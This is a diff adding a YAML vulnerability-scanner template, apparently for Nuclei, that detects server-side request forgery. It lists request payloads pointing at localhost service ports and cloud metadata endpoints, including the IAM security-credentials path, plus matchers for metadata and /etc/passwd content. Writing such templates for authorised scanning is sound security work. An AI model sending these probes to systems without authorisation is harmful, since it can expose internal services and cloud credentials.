@@ -1,0 +1,64 @@
+id: ssrf-internal-network
+info:
+  name: Server-Side Request Forgery (SSRF) Detection
+  author: rengine-custom
+  severity: high
+  description: |
+    Detects SSRF vulnerabilities that allow attackers to make the server
+    send requests to internal network resources or cloud metadata services.
+  tags: ssrf,vulnerability,owasp-a10,cloud,metadata
+  reference:
+    - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
+    - https://portswigger.net/web-security/ssrf
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=http://127.0.0.1"
+      - "{{BaseURL}}/?url=http://localhost"
+      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?url=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/?target=http://127.0.0.1:22"
+      - "{{BaseURL}}/?target=http://127.0.0.1:3306"
+      - "{{BaseURL}}/?target=http://127.0.0.1:5432"
+      - "{{BaseURL}}/?target=http://127.0.0.1:6379"
+      - "{{BaseURL}}/?redirect=http://127.0.0.1"
+      - "{{BaseURL}}/?fetch=http://169.254.169.254"
+      - "{{BaseURL}}/?uri=http://127.0.0.1"
+      - "{{BaseURL}}/?src=http://127.0.0.1"
+      - "{{BaseURL}}/?image=http://127.0.0.1"
+      - "{{BaseURL}}/?load=http://127.0.0.1"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "iam/security-credentials"
+          - "local-hostname"
+          - "local-ipv4"
+          - "public-hostname"
+          - "public-ipv4"
+          - "placement/availability-zone"
+        part: body
+        condition: or
+
+      - type: word
+        words:
+          - "computeMetadata"
+          - "instance/service-accounts"
+          - "project/project-id"
+          - "instance/network-interfaces"
+        part: body
+        condition: or
+
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "SSH-2.0-OpenSSH"
+          - "220.*FTP"
+          - "\\+OK"
+          - "\\-ERR"
+        part: body
+        condition: or
